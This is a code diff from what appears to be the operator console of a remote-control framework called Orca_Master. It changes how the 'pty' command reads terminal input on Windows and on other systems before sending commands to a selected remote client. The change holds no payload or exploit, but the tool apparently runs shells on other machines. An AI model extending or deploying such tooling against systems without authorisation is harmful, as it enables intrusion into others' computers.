@@ -5,11 +5,13 @@ import (
 	"Orca_Master/cli/common"
 	"Orca_Master/define/colorcode"
 	"Orca_Master/define/retcode"
+	"bufio"
 	"bytes"
 	"fmt"
 	"github.com/desertbit/grumble"
 	"os"
 	"os/signal"
+	"runtime"
 	"time"
 )
 
@@ -42,14 +44,20 @@ var ptyCmd = &grumble.Command{
 		case <-time.After(10 * time.Second):
 			return fmt.Errorf("request timed out")
 		}
-
-		var data []byte
 		for {
-			input := [512]byte{}
-			os.Stdin.Read(input[:])
-			data = bytes.Replace(input[:], []byte{13, 10}, []byte{10, 00}, -1) // 将windows\r\n替换为linux的\n
-			data = bytes.Trim(data, "\x00")
-			cmd := string(data)
+			var cmd string
+			if runtime.GOOS == "windows" {
+				input := [512]byte{}
+				os.Stdin.Read(input[:])
+				data := bytes.Replace(input[:], []byte{13, 10}, []byte{10, 00}, -1) // 将windows\r\n替换为linux的\n
+				data = bytes.Trim(data, "\x00")
+				cmd = string(data)
+			} else {
+				reader := bufio.NewReader(os.Stdin)
+				data, _ := reader.ReadBytes('\n')
+				cmd = string(data)
+			}
+
 			retData = ptyopt.SendCommandToPty(SelectClientId, cmd)
 			if retData.Code != retcode.SUCCESS {
 				colorcode.PrintMessage(colorcode.SIGN_FAIL, "command send failed")
